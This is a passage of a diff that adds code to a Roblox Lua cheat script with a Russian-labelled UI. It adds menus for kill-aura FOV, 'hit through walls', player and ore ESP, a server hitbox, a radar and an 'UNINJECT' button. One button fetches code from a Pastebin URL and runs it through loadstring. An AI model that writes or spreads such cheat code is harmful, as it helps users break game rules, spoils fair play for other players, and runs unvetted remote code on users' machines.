+        end)
+        UIS.InputChanged:Connect(function(inp)
+            if fovDragging and inp.UserInputType == Enum.UserInputType.MouseMovement then
+                local rx = math.clamp((inp.Position.X - fovBg.AbsolutePosition.X) / fovBg.AbsoluteSize.X, 0, 1)
+                local fovRange = blatantUnlocked and 250 or 100  -- max FOV: 350 or 200
+                local val = 100 + math.floor(rx * fovRange)
+                abaddonPowerFOV = val
+                fovFill.Size = UDim2.new((val - 100) / fovRange, 0, 1, 0)
+                fovLbl.Text = "FOV: " .. val
+                updateAbaddonFovCircle()
+            end
+        end)
+
+        -- ── Show FOV Circle Toggle ─────────────────────────────
+        local showFovBtn = Instance.new("TextButton", drop)
+        showFovBtn.Size = UDim2.new(1, 0, 0, 30)
+        showFovBtn.Font = Enum.Font.Gotham
+        showFovBtn.TextSize = 13
+        showFovBtn.AutoButtonColor = false
+        showFovBtn.BackgroundTransparency = 0.6
+        Instance.new("UICorner", showFovBtn).CornerRadius = UDim.new(0, 8)
+
+        local function updShowFov()
+            showFovBtn.Text = abaddonPowerShowFOV and "FOV Circle: ON" or "FOV Circle: OFF"
+            showFovBtn.BackgroundColor3 = abaddonPowerShowFOV and currentThemeColor or Color3.fromRGB(40, 40, 40)
+            showFovBtn.BackgroundTransparency = abaddonPowerShowFOV and 0.3 or 0.6
+            showFovBtn.TextColor3 = abaddonPowerShowFOV and Color3.new(0, 0, 0) or Color3.new(1, 1, 1)
+        end
+        sliderSyncFns["powerShowFOV"] = function(v) abaddonPowerShowFOV=v; updShowFov() end
+        updShowFov()
+
+        showFovBtn.MouseButton1Click:Connect(function()
+            abaddonPowerShowFOV = not abaddonPowerShowFOV
+            updShowFov()
+            syncAuraNotif()
+        end)
+
+        -- ── Keybind Button ─────────────────────────────────────
+        -- Hit through walls (Blatant only)
+        local htwBtn = Instance.new("TextButton", drop)
+        htwBtn.Size = UDim2.new(1, 0, 0, 30)
+        htwBtn.Font = Enum.Font.Gotham
+        htwBtn.TextSize = 13
+        htwBtn.AutoButtonColor = false
+        htwBtn.BorderSizePixel = 0
+        htwBtn.Visible = false
+        Instance.new("UICorner", htwBtn).CornerRadius = UDim.new(0, 8)
+        blatantHitWallsBtn = htwBtn
+        local function updHtwBtn()
+            if not blatantUnlocked then htwBtn.Visible = false; return end
+            htwBtn.Visible = true
+            htwBtn.Text = blatantHitThroughWalls and "Hit Walls: ON" or "Hit Walls: OFF"
+            htwBtn.BackgroundColor3 = blatantHitThroughWalls and currentThemeColor or Color3.fromRGB(40,40,40)
+            htwBtn.BackgroundTransparency = blatantHitThroughWalls and 0.3 or 0.6
+            htwBtn.TextColor3 = blatantHitThroughWalls and Color3.new(0,0,0) or Color3.new(1,1,1)
+        end
+        updHtwBtn()
+        sliderSyncFns["blatantHitWalls"] = updHtwBtn
+        htwBtn.MouseButton1Click:Connect(function()
+            if not blatantUnlocked then return end
+            blatantHitThroughWalls = not blatantHitThroughWalls
+            updHtwBtn()
+        end)
+
+        local keybindBtn = Instance.new("TextButton", drop)
+        keybindBtn.Size = UDim2.new(1, 0, 0, 30)
+        keybindBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        keybindBtn.Text = (abaddonPowerKeybind == Enum.KeyCode.Unknown) and "Bind: Not set" or ("Bind: " .. abaddonPowerKeybind.Name)
+        sliderSyncFns["powerBind"] = function(v) keybindBtn.Text = (v==Enum.KeyCode.Unknown) and "Bind: Not set" or ("Bind: "..v.Name) end
+        keybindBtn.TextColor3 = Color3.new(1, 1, 1)
+        keybindBtn.Font = Enum.Font.Gotham
+        keybindBtn.TextSize = 13
+        keybindBtn.BackgroundTransparency = 0.5
+        Instance.new("UICorner", keybindBtn).CornerRadius = UDim.new(0, 8)
+
+        keybindBtn.MouseButton1Click:Connect(function()
+            keybindBtn.Text = "Press a key..."
+            local conn
+            conn = UIS.InputBegan:Connect(function(inp, gpe)
+                if not gpe and inp.KeyCode ~= Enum.KeyCode.Unknown then
+                    abaddonPowerKeybind = inp.KeyCode
+                    keybindBtn.Text = "Bind: " .. inp.KeyCode.Name
+                    conn:Disconnect()
+                end
+            end)
+        end)
+
+        -- ── Expand / Collapse ──────────────────────────────────
+        local exp = false
+        arr.MouseButton1Click:Connect(function()
+            exp = not exp
+            arr.Text = exp and "^" or "v"
+            TS:Create(c, TweenInfo.new(0.3), {Size = exp and UDim2.new(1, 0, 0, 210) or UDim2.new(1, 0, 0, 32)}):Play()
+        end)
+    end
+    -- ============================================================
+
+
+
+    local function createWorldColorSection()
+        local sec = Instance.new("Frame", s)
+        sec.Name = "WorldColorSection"
+        sec.Size = UDim2.new(1, 0, 0, 32)
+        sec.BackgroundTransparency = 1
+        Instance.new("UIListLayout", sec).SortOrder = Enum.SortOrder.LayoutOrder
+
+        local c = Instance.new("Frame", sec)
+        c.Size = UDim2.new(1, 0, 0, 32)
+        c.BackgroundTransparency = 1
+
+        local mainBtn = Instance.new("TextButton", c)
+        mainBtn.Size = UDim2.new(1, -36, 1, 0)
+        mainBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        mainBtn.BackgroundTransparency = 0.6
+        mainBtn.Text = "World Color"
+        mainBtn.Font = Enum.Font.Gotham
+        mainBtn.TextSize = 14
+        mainBtn.TextColor3 = Color3.new(1, 1, 1)
+        mainBtn.AutoButtonColor = false
+        mainBtn.BorderSizePixel = 0
+        Instance.new("UICorner", mainBtn).CornerRadius = UDim.new(0, 12)
+        activeButtonStates[mainBtn] = wcEnabled
+        buttonSyncFns["worldColor"] = function(st)
+            wcEnabled = st
+            mainBtn.BackgroundColor3 = st and currentThemeColor or Color3.fromRGB(40, 40, 40)
+            mainBtn.BackgroundTransparency = st and 0.3 or 0.6
+            mainBtn.TextColor3 = st and Color3.new(0, 0, 0) or Color3.new(1, 1, 1)
+            activeButtonStates[mainBtn] = st
+        end
+        mainBtn.MouseButton1Click:Connect(function()
+            toggleWorldColor(not wcEnabled)
+            buttonSyncFns["worldColor"](wcEnabled)
+        end)
+
+        local arr = Instance.new("TextButton", c)
+        arr.Size = UDim2.new(0, 30, 1, 0)
+        arr.Position = UDim2.new(1, -30, 0, 0)
+        arr.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        arr.BackgroundTransparency = 0.6
+        arr.Text = "v"
+        arr.Font = Enum.Font.GothamBold
+        arr.TextSize = 13
+        arr.TextColor3 = Color3.new(1, 1, 1)
+        arr.AutoButtonColor = false
+        arr.BorderSizePixel = 0
+        Instance.new("UICorner", arr).CornerRadius = UDim.new(0, 12)
+
+        local drop = Instance.new("Frame", sec)
+        drop.Size = UDim2.new(1, 0, 0, 0)
+        drop.BackgroundTransparency = 1
+        drop.ClipsDescendants = true
+        Instance.new("UIListLayout", drop).Padding = UDim.new(0, 4)
+
+        -- Color preview square
+        local wcPreviewFr=Instance.new("Frame",drop)
+        wcPreviewFr.Size=UDim2.new(1,0,0,36); wcPreviewFr.BackgroundTransparency=1
+        local wcPreviewBox=Instance.new("Frame",wcPreviewFr)
+        wcPreviewBox.AnchorPoint=Vector2.new(0,0.5)
+        wcPreviewBox.Position=UDim2.new(0,0,0.5,0)
+        wcPreviewBox.Size=UDim2.new(0,48,0,28)
+        wcPreviewBox.BackgroundColor3=Color3.fromRGB(wcColorR,wcColorG,wcColorB)
+        wcPreviewBox.BorderSizePixel=0
+        Instance.new("UICorner",wcPreviewBox).CornerRadius=UDim.new(0,8)
+        local function wcUpdatePreview()
+            wcPreviewBox.BackgroundColor3=Color3.fromRGB(wcColorR,wcColorG,wcColorB)
+        end
+
+        -- Three color sliders: R, G, B
+        local sliderDefs = {
+            { lbl = "Red",   col = Color3.fromRGB(255,80,80),  get = function() return wcColorR end, set = function(v) wcColorR=v end },
+            { lbl = "Green", col = Color3.fromRGB(80,255,80),  get = function() return wcColorG end, set = function(v) wcColorG=v end },
+            { lbl = "Blue",  col = Color3.fromRGB(80,80,255),  get = function() return wcColorB end, set = function(v) wcColorB=v end },
+        }
+        for _, def in ipairs(sliderDefs) do
+            local fr = Instance.new("Frame", drop)
+            fr.Size = UDim2.new(1, 0, 0, 30)
+            fr.BackgroundTransparency = 1
+            local ll = Instance.new("TextLabel", fr)
+            ll.Size = UDim2.new(1, 0, 0, 14)
+            ll.BackgroundTransparency = 1
+            ll.TextColor3 = def.col
+            ll.Font = Enum.Font.GothamBold
+            ll.TextSize = 10
+            ll.TextXAlignment = Enum.TextXAlignment.Left
+            ll.Text = def.lbl .. ": " .. def.get()
+            local slBg = Instance.new("TextButton", fr)
+            slBg.Size = UDim2.new(1, 0, 0, 10)
+            slBg.Position = UDim2.new(0, 0, 0, 18)
+            slBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+            slBg.BackgroundTransparency = 0.5
+            slBg.AutoButtonColor = false
+            slBg.Text = ""
+            slBg.BorderSizePixel = 0
+            Instance.new("UICorner", slBg).CornerRadius = UDim.new(1, 0)
+            local slFill = Instance.new("Frame", slBg)
+            slFill.Name = "WCSliderFill"
+            slFill.Size = UDim2.new(def.get() / 255, 0, 1, 0)
+            slFill.BackgroundColor3 = def.col
+            slFill.BorderSizePixel = 0
+            Instance.new("UICorner", slFill).CornerRadius = UDim.new(1, 0)
+            local drag = false
+            slBg.InputBegan:Connect(function(i)
+                if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = true end
+            end)
+            slBg.InputEnded:Connect(function(i)
+                if i.UserInputType == Enum.UserInputType.MouseButton1 then drag = false end
+            end)
+            local col = def.col
+            UIS.InputChanged:Connect(function(i)
+                if drag and i.UserInputType == Enum.UserInputType.MouseMovement then
+                    local rx = math.clamp((i.Position.X - slBg.AbsolutePosition.X) / slBg.AbsoluteSize.X, 0, 1)
+                    def.set(math.floor(rx * 255))
+                    slFill.Size = UDim2.new(rx, 0, 1, 0)
+                    ll.Text = def.lbl .. ": " .. def.get()
+                    wcUpdatePreview()
+                    if wcEnabled then pcall(wcApply) end
+                end
+            end)
+        end
+
+        -- Intensity slider
+        local intFrame = Instance.new("Frame", drop)
+        intFrame.Size = UDim2.new(1,0,0,30); intFrame.BackgroundTransparency=1
+        local intLbl = Instance.new("TextLabel", intFrame)
+        intLbl.Size=UDim2.new(1,0,0,14); intLbl.BackgroundTransparency=1
+        intLbl.TextColor3=currentThemeColor; intLbl.Font=Enum.Font.GothamBold; intLbl.TextSize=10
+        intLbl.TextXAlignment=Enum.TextXAlignment.Left
+        intLbl.Text = "Intensity: " .. math.floor(wcIntensity*100) .. "%"
+        local intBg = Instance.new("TextButton", intFrame)
+        intBg.Size=UDim2.new(1,0,0,10); intBg.Position=UDim2.new(0,0,0,18)
+        intBg.BackgroundColor3=Color3.fromRGB(40,40,40); intBg.BackgroundTransparency=0.5
+        intBg.AutoButtonColor=false; intBg.Text=""; intBg.BorderSizePixel=0
+        Instance.new("UICorner",intBg).CornerRadius=UDim.new(1,0)
+        local intFill = Instance.new("Frame", intBg)
+        intFill.Name="WCSliderFill"; intFill.Size=UDim2.new(wcIntensity,0,1,0)
+        intFill.BackgroundColor3=currentThemeColor; intFill.BorderSizePixel=0
+        Instance.new("UICorner",intFill).CornerRadius=UDim.new(1,0)
+        local intDrag=false
+        intBg.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then intDrag=true end end)
+        intBg.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then intDrag=false end end)
+        UIS.InputChanged:Connect(function(i)
+            if intDrag and i.UserInputType==Enum.UserInputType.MouseMovement then
+                local rx=math.clamp((i.Position.X-intBg.AbsolutePosition.X)/intBg.AbsoluteSize.X,0,1)
+                wcIntensity=rx; intFill.Size=UDim2.new(rx,0,1,0)
+                intLbl.Text="Intensity: "..math.floor(rx*100).."%"
+                if wcEnabled then pcall(wcApply) end
+            end
+        end)
+
+
+
+        -- 3 color + intensity
+        local EXPANDED = 3*(30+4) + (30+4)
+        local expanded = false
+        arr.MouseButton1Click:Connect(function()
+            expanded = not expanded
+            arr.Text = expanded and "^" or "v"
+            TS:Create(drop, TweenInfo.new(0.25), {Size = UDim2.new(1, 0, 0, expanded and EXPANDED or 0)}):Play()
+            TS:Create(sec,  TweenInfo.new(0.25), {Size = UDim2.new(1, 0, 0, expanded and 32 + EXPANDED or 32)}):Play()
+        end)
+    end
+
+
+    createAbaddonHudSection()
+    -- Store power section creator for blatant unlock
+    getgenv()._spawnAbaddonPower = createAbaddonPowerSection
+    createBedAlarmSection()
+    createPlayerEspSection()
+    createHitChamsSection()
+    createHitSoundSection()
+    createToggle("Kit Resources ESP", function(state)
+        isKitEspEnabled = state
+        if state then enableKitEsp() else resetKitEsp() end
+    end, false, "kitEsp")
+    createMiloEspSection()
+    -- Ore ESP Section with color customization
+    local function createOreEspSection()
+        local sec = Instance.new("Frame", s)
+        sec.Name = "OreEspSection"
+        sec.Size = UDim2.new(1, 0, 0, 32)
+        sec.BackgroundTransparency = 1
+        Instance.new("UIListLayout", sec).SortOrder = Enum.SortOrder.LayoutOrder
+
+        local c = Instance.new("Frame", sec)
+        c.Size = UDim2.new(1, 0, 0, 32)
+        c.BackgroundTransparency = 1
+
+        local mainBtn = Instance.new("TextButton", c)
+        mainBtn.Size = UDim2.new(1, -36, 1, 0)
+        mainBtn.Font = Enum.Font.Gotham; mainBtn.TextSize = 14
+        mainBtn.AutoButtonColor = false; mainBtn.BorderSizePixel = 0
+        Instance.new("UICorner", mainBtn).CornerRadius = UDim.new(0, 12)
+        activeButtonStates[mainBtn] = isOreEspEnabled
+        local function updOreBtn()
+            mainBtn.Text = "Ore ESP"
+            mainBtn.BackgroundColor3 = isOreEspEnabled and currentThemeColor or Color3.fromRGB(40,40,40)
+            mainBtn.BackgroundTransparency = isOreEspEnabled and 0.3 or 0.6
+            mainBtn.TextColor3 = isOreEspEnabled and Color3.new(0,0,0) or Color3.new(1,1,1)
+            activeButtonStates[mainBtn] = isOreEspEnabled
+        end
+        updOreBtn()
+        buttonSyncFns["oreEsp"] = function(st)
+            isOreEspEnabled = st
+            if st then enableOreEsp() else disableOreEsp() end
+            updOreBtn()
+        end
+        mainBtn.MouseButton1Click:Connect(function()
+            isOreEspEnabled = not isOreEspEnabled
+            if isOreEspEnabled then enableOreEsp() else disableOreEsp() end
+            updOreBtn()
+        end)
+
+        local arr = Instance.new("TextButton", c)
+        arr.Size = UDim2.new(0, 30, 1, 0); arr.Position = UDim2.new(1, -30, 0, 0)
+        arr.BackgroundColor3 = Color3.fromRGB(40,40,40); arr.BackgroundTransparency = 0.6
+        arr.Text = "v"; arr.Font = Enum.Font.GothamBold; arr.TextSize = 13
+        arr.TextColor3 = Color3.new(1,1,1); arr.AutoButtonColor = false; arr.BorderSizePixel = 0
+        Instance.new("UICorner", arr).CornerRadius = UDim.new(0, 12)
+
+        local drop = Instance.new("Frame", sec)
+        drop.Size = UDim2.new(1, 0, 0, 0)
+        drop.BackgroundTransparency = 1; drop.ClipsDescendants = true
+        local dropLayout = Instance.new("UIListLayout", drop)
+        dropLayout.Padding = UDim.new(0, 4)
+
+        -- Color preview rect
+        local previewFr = Instance.new("Frame", drop)
+        previewFr.Size = UDim2.new(1, 0, 0, 36); previewFr.BackgroundTransparency = 1
+        local previewBox = Instance.new("Frame", previewFr)
+        previewBox.AnchorPoint = Vector2.new(0, 0.5)
+        previewBox.Position = UDim2.new(0, 0, 0.5, 0)
+        previewBox.Size = UDim2.new(0, 48, 0, 28)
+        previewBox.BackgroundColor3 = Color3.fromRGB(oreEspColorR, oreEspColorG, oreEspColorB)
+        previewBox.BorderSizePixel = 0
+        Instance.new("UICorner", previewBox).CornerRadius = UDim.new(0, 6)
+        -- Stroke to mimic Highlight outline look
+        local previewStroke = Instance.new("UIStroke", previewBox)
+        previewStroke.Color = Color3.fromRGB(oreEspColorR, oreEspColorG, oreEspColorB)
+        previewStroke.Thickness = 2
+
+        local previewLabel = Instance.new("TextLabel", previewFr)
+        previewLabel.Size = UDim2.new(1, -60, 1, 0)
+        previewLabel.Position = UDim2.new(0, 56, 0, 0)
+        previewLabel.BackgroundTransparency = 1
+        previewLabel.TextColor3 = Color3.fromRGB(160,160,160)
+        previewLabel.Font = Enum.Font.Gotham; previewLabel.TextSize = 10
+        previewLabel.TextXAlignment = Enum.TextXAlignment.Left
+        previewLabel.Text = "Outline Color Preview"
+
+        local function updateOrePreview()
+            local col = Color3.fromRGB(oreEspColorR, oreEspColorG, oreEspColorB)
+            previewBox.BackgroundColor3 = col
+            previewStroke.Color = col
+        end
+
+        -- RGB sliders
+        local sliderDefs = {
+            { lbl="Red",   col=Color3.fromRGB(255,80,80),  getV=function() return oreEspColorR end, setV=function(v) oreEspColorR=v end, syncKey="oreEspR" },
+            { lbl="Green", col=Color3.fromRGB(80,255,80),  getV=function() return oreEspColorG end, setV=function(v) oreEspColorG=v end, syncKey="oreEspG" },
+            { lbl="Blue",  col=Color3.fromRGB(80,80,255),  getV=function() return oreEspColorB end, setV=function(v) oreEspColorB=v end, syncKey="oreEspB" },
+        }
+        for _, def in ipairs(sliderDefs) do
+            local fr = Instance.new("Frame", drop)
+            fr.Size = UDim2.new(1, 0, 0, 30); fr.BackgroundTransparency = 1
+            local ll = Instance.new("TextLabel", fr)
+            ll.Size = UDim2.new(1, 0, 0, 14); ll.BackgroundTransparency = 1
+            ll.TextColor3 = def.col; ll.Font = Enum.Font.GothamBold; ll.TextSize = 10
+            ll.TextXAlignment = Enum.TextXAlignment.Left
+            ll.Text = def.lbl .. ": " .. def.getV()
+            local slBg = Instance.new("TextButton", fr)
+            slBg.Size = UDim2.new(1, 0, 0, 10); slBg.Position = UDim2.new(0, 0, 0, 18)
+            slBg.BackgroundColor3 = Color3.fromRGB(40,40,40); slBg.BackgroundTransparency = 0.5
+            slBg.AutoButtonColor = false; slBg.Text = ""; slBg.BorderSizePixel = 0
+            Instance.new("UICorner", slBg).CornerRadius = UDim.new(1, 0)
+            local slFill = Instance.new("Frame", slBg)
+            slFill.Name = "SliderFill"
+            slFill.Size = UDim2.new(def.getV()/255, 0, 1, 0)
+            slFill.BackgroundColor3 = def.col; slFill.BorderSizePixel = 0
+            Instance.new("UICorner", slFill).CornerRadius = UDim.new(1, 0)
+            local drag = false
+            local function applyOreColor(v)
+                def.setV(v)
+                slFill.Size = UDim2.new(v/255, 0, 1, 0)
+                ll.Text = def.lbl .. ": " .. v
+                updateOrePreview()
+                if isOreEspEnabled then pcall(oreEspUpdateColors) end
+            end
+            sliderSyncFns[def.syncKey] = function(v) applyOreColor(v) end
+            slBg.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then drag=true end end)
+            slBg.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then drag=false end end)
+            UIS.InputChanged:Connect(function(i)
+                if drag and i.UserInputType==Enum.UserInputType.MouseMovement then
+                    local sz = slBg.AbsoluteSize.X; if sz < 1 then return end
+                    local rx = math.clamp((i.Position.X - slBg.AbsolutePosition.X)/sz, 0, 1)
+                    applyOreColor(math.floor(rx*255))
+                end
+            end)
+        end
+
+        local EXPANDED = 36 + 4 + 3*(30+4)
+        local expanded = false
+        arr.MouseButton1Click:Connect(function()
+            expanded = not expanded; arr.Text = expanded and "^" or "v"
+            TS:Create(drop, TweenInfo.new(0.25), {Size=UDim2.new(1,0,0,expanded and EXPANDED or 0)}):Play()
+            TS:Create(sec,  TweenInfo.new(0.25), {Size=UDim2.new(1,0,0,expanded and 32+EXPANDED or 32)}):Play()
+        end)
+    end
+    createOreEspSection()
+    createPanicCircleSection()
+    createToggle("Server Hitbox", function(st)
+        isServerHitboxEnabled = st
+        updateServerHitbox()
+    end, false, "serverHitbox")
+    createToggle("Strategic Block ESP", function(state)
+        isStrategicEspEnabled = state
+        if state then enableStrategicEsp() else disableStrategicEsp() end
+    end, false, "strategicEsp")
+    createToggle("Target Scanner", function(st) isTargetScannerEnabled=st; isTargetInfoEnabled=st end, false, "targetScanner")
+    createWorldColorSection()
+    createPrimeModeSection()
+    createToggle("Crosshair HP", function(st) toggleCrosshairHp(st) end, false, "crosshairHp")
+    createToggle("Player Radar", function(st) toggleRadar(st) end, false, "playerRadar")
+
+    visualWin = f
+    savedWindowPositions[f] = f.Position
+    applyLayoutPos(f)
+end
+
+-- === КНОПКА UNINJECT ===
+function createUninjectButton()
+    local btn = Instance.new("TextButton", gui)
+    btn.Name = "UninjectTopBtn"
+    btn.Size = UDim2.new(0, 120, 0, 30)
+    btn.Position = UDim2.new(1, -140, 1, -130)
+    btn.BackgroundColor3 = Color3.fromRGB(200, 40, 40)
+    btn.Text = "UNINJECT"
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.Font = Enum.Font.SourceSansBold
+    btn.TextSize = 18
+    btn.BackgroundTransparency = 0.3
+    btn.Visible = isMenuOpen
+    btn.AutoButtonColor = true 
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+    
+    btn.MouseButton1Click:Connect(function()
+        if mainLoopConnection then mainLoopConnection:Disconnect() end
+        if staffStatsConnection then staffStatsConnection:Disconnect() end
+        if friendHpConnection then friendHpConnection:Disconnect() end
+        if serverHpConnection then serverHpConnection:Disconnect() end
+        if autokitConnection then autokitConnection:Disconnect() end
+        if fisherConnection then fisherConnection:Disconnect() end
+        if farmerConnection then farmerConnection:Disconnect() end
+        if abaddonPowerConnection then abaddonPowerConnection:Disconnect() end
+        isAbaddonPowerEnabled = false
+        getgenv()._abaddonPowerSectionCreated = nil
+        getgenv()._spawnAbaddonPower = nil
+        if _mainInputConn then pcall(function() _mainInputConn:Disconnect() end); _mainInputConn = nil end
+
+        if player.Character and player.Character:FindFirstChild("Humanoid") then
+            camera.CameraSubject = player.Character.Humanoid
+        end
+        currentSpectateTarget = nil
+
+        -- Cleanup Aura notif and FOV circle
+        isAbaddonPowerEnabled = false
+        if abaddonAuraNotifGui then abaddonAuraNotifGui:Destroy() abaddonAuraNotifGui = nil end
+        if abaddonFovCircle then abaddonFovCircle:Destroy() abaddonFovCircle = nil end
+
+        gui:Destroy()
+
+        if espFolderPlayers then espFolderPlayers:ClearAllChildren(); espFolderPlayers:Destroy() end
+        destroyServerHitboxClone()
+        pcall(function() RS:UnbindFromRenderStep("AbaddonServerHitbox") end)
+        if espFolder then espFolder:Destroy() end
+        if targetEspBox then targetEspBox:Destroy() end
+        if bedAlarmPart then bedAlarmPart:Destroy() end
+        if panicCirclePart then panicCirclePart:Destroy() end
+        if bedAlarmGui then bedAlarmGui:Destroy() end
+        
+		
+        
+        if kitEspFolder then kitEspFolder:Destroy() end
+        for _, c in pairs(kitEspConnections) do
+            pcall(function() c:Disconnect() end)
+        end
+        
+        if strategicEspFolder then strategicEspFolder:Destroy() end
+        for _, c in pairs(strategicEspConnections) do
+            pcall(function() c:Disconnect() end)
+        end
+        if isOreEspEnabled then pcall(disableOreEsp) end
+        if isTaliyahEnabled then
+            if taliyahConnection then pcall(function() taliyahConnection:Disconnect() end); taliyahConnection = nil end
+            if taliyahGui then pcall(function() taliyahGui:Destroy() end); taliyahGui = nil end
+            taliyahGuiRefs = {}
+        end
+        
+        local oldSnd = game.SoundService:FindFirstChild(ALARM_SOUND_NAME)
+        if oldSnd then oldSnd:Destroy() end
+        
+        local oldPanicSnd = game.SoundService:FindFirstChild(PANIC_SOUND_NAME)
+        if oldPanicSnd then oldPanicSnd:Destroy() end
+
+        -- Crosshair HP cleanup
+        pcall(destroyCrosshairHp)
+        -- Prime Mode full cleanup
+        if voidDropConnection then voidDropConnection:Disconnect(); voidDropConnection=nil end
+        isVoidDropEnabled = false
+        pcall(destroyHitChams)
+        pcall(destroyRadar)
+        pcall(primeModeCleanup)
+        pcall(wcDestroy); wcEnabled=false
+        -- Crosshair HP cleanup
+        pcall(destroyCrosshairHp)
+        isCrosshairHpEnabled = false
+        isHitSoundEnabled = false
+		scannerIsSpinning = false
+		scannerLastHp     = nil
+		scannerDisplayHp  = nil
+		scannerRotation   = 0 
+        
+        if blurEffect then blurEffect:Destroy() end
+        if notifGui then notifGui:Destroy(); notifGui = nil end
+        table.clear(notifStack)
+        if mainHudGui then mainHudGui:Destroy(); mainHudGui = nil end
+
+        _hubActive = false
+        script:Destroy()
+    end)
+    uninjectBtn = btn
+    savedWindowPositions[btn] = btn.Position
+end
+
+-- === КНОПКА BED MINIGAME ===
+function createBedMinigameButton()
+createUnlockButton()
+    local btn = Instance.new("TextButton", gui)
+    btn.Name = "BedMinigameBtn"
+    btn.Size = UDim2.new(0, 120, 0, 30)
+    btn.Position = UDim2.new(1, -140, 1, -50)
+    btn.BackgroundColor3 = Color3.fromRGB(40, 200, 40)
+    btn.Text = "BedMinigame"
+    btn.TextColor3 = Color3.new(1,1,1)
+    btn.Font = Enum.Font.SourceSansBold
+    btn.TextSize = 16
+    btn.BackgroundTransparency = 0.3
+    btn.Visible = isMenuOpen
+    btn.AutoButtonColor = true 
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+    
+    btn.MouseButton1Click:Connect(function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/Tyj2nd1D", true))()
+    end)
+    bedMinigameBtn = btn
+    savedWindowPositions[btn] = btn.Position
+end
+
+-- === UNLOCK BLATANT BUTTON ===
+function createUnlockButton()
+    local btn = Instance.new("TextButton", gui)
+    btn.Name = "UnlockBtn"
+    btn.Size = UDim2.new(0, 120, 0, 30)
+    btn.Position = UDim2.new(1, -140, 1, -170)
+    btn.BackgroundColor3 = Color3.fromRGB(220, 180, 0)
+    btn.Text = "Unlock"
+    btn.TextColor3 = Color3.new(0, 0, 0)
+    btn.Font = Enum.Font.SourceSansBold
+    btn.TextSize = 16
+    btn.BackgroundTransparency = 0.3
+    btn.Visible = isMenuOpen
+    btn.AutoButtonColor = true
+    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
+
+    btn.MouseButton1Click:Connect(function()
+        if blatantUnlocked then return end
+        -- Close menu
+        toggleMenuWithAnimation(false)
+        -- Show confirmation dialog
+        if unlockConfirmGui then unlockConfirmGui:Destroy() end
+        local pg = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
+        local sg = Instance.new("ScreenGui", pg)
+        sg.Name = "UnlockConfirmGui"
+        sg.DisplayOrder = 9999
+        sg.ResetOnSpawn = false
+        sg.IgnoreGuiInset = true
+        unlockConfirmGui = sg
+
+        -- Backdrop
+        local backdrop = Instance.new("Frame", sg)
+        backdrop.Size = UDim2.new(1, 0, 1, 0)
+        backdrop.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        backdrop.BackgroundTransparency = 0.55
+        backdrop.BorderSizePixel = 0
+
+        -- Dialog frame
+        local dlg = Instance.new("Frame", sg)
+        dlg.Name = "Dialog"
+        dlg.Size = UDim2.new(0, 380, 0, 160)
+        dlg.AnchorPoint = Vector2.new(0.5, 0.5)
+        dlg.Position = UDim2.new(0.5, 0, 0.5, 0)
+        dlg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        dlg.BackgroundTransparency = 0.35
+        dlg.BorderSizePixel = 0
+        Instance.new("UICorner", dlg).CornerRadius = UDim.new(0, 10)
+        local stroke = Instance.new("UIStroke", dlg)
+        stroke.Color = currentThemeColor
+        stroke.Thickness = 1.5
+        stroke.Transparency = 0.3
+
+        -- Title
+        local title = Instance.new("TextLabel", dlg)
+        title.Size = UDim2.new(1, -20, 0, 28)
+        title.Position = UDim2.new(0, 10, 0, 10)
+        title.BackgroundTransparency = 1
+        title.Text = "WARNING"
+        title.Font = Enum.Font.GothamBlack
+        title.TextSize = 18
+        title.TextColor3 = currentThemeColor
+        title.TextXAlignment = Enum.TextXAlignment.Left
+
+        -- Body
+        local body = Instance.new("TextLabel", dlg)
+        body.Size = UDim2.new(1, -20, 0, 60)
+        body.Position = UDim2.new(0, 10, 0, 42)
+        body.BackgroundTransparency = 1
+        body.Text = "Are you sure you want to unlock blatant features?\nConfig saving will be disabled for extended values."
+        body.Font = Enum.Font.Gotham
+        body.TextSize = 13
+        body.TextColor3 = Color3.fromRGB(220, 220, 220)
+        body.TextWrapped = true
+        body.TextXAlignment = Enum.TextXAlignment.Left
+
+        -- No button
+        local noBtn = Instance.new("TextButton", dlg)
+        noBtn.Size = UDim2.new(0, 130, 0, 32)
+        noBtn.Position = UDim2.new(0, 16, 1, -46)
+        noBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+        noBtn.BackgroundTransparency = 0.3
+        noBtn.Text = "No"
+        noBtn.TextColor3 = Color3.new(1, 1, 1)
+        noBtn.Font = Enum.Font.GothamBold
+        noBtn.TextSize = 14
+        noBtn.AutoButtonColor = false
+        noBtn.BorderSizePixel = 0
+        Instance.new("UICorner", noBtn).CornerRadius = UDim.new(0, 8)
+        noBtn.MouseEnter:Connect(function() noBtn.BackgroundColor3 = Color3.fromRGB(90,90,90) end)
+        noBtn.MouseLeave:Connect(function() noBtn.BackgroundColor3 = Color3.fromRGB(60,60,60) end)
+        noBtn.MouseButton1Click:Connect(function()
+            sg:Destroy(); unlockConfirmGui = nil
+            toggleMenuWithAnimation(true)
+        end)
+
+        -- Yes button
+        local yesBtn = Instance.new("TextButton", dlg)
+        yesBtn.Size = UDim2.new(0, 130, 0, 32)
+        yesBtn.Position = UDim2.new(1, -146, 1, -46)
+        yesBtn.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
+        yesBtn.BackgroundTransparency = 0.2
+        yesBtn.Text = "Yes, Unlock"
+        yesBtn.TextColor3 = Color3.new(0, 0, 0)
+        yesBtn.Font = Enum.Font.GothamBold
+        yesBtn.TextSize = 14
+        yesBtn.AutoButtonColor = false
+        yesBtn.BorderSizePixel = 0
+        Instance.new("UICorner", yesBtn).CornerRadius = UDim.new(0, 8)
